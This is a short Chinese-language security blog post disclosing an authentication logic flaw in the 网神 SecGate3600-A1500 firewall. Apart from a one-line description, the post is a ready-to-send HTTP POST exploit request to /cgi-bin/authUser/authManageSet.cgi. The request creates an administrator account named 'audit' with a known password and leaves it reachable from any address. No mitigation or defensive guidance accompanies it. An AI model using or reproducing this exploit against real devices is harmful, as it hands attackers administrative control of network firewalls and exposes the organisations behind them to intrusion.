#  1day ｜ 网神SecGate3600-A1500会话鉴权逻辑漏洞   
原创 土拨鼠  土拨鼠的安全屋   2024-11-09 20:57  
  
# 漏洞描述  
  
网神SecGate3600-A1500会话鉴权逻辑存在问题导致，登录绕过获取管理员权限。  
# 漏洞利用  
```
POST /cgi-bin/authUser/authManageSet.cgi HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0
Accept: application/xml, text/xml, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Content-Length: 93
Connection: close
 
type=saveAdmin&id=2&userName=audit&pwd=audit@1234&net=0.0.0.0&mask=0.0.0.0&port=ANY&allow=Y

```  
  
  
  
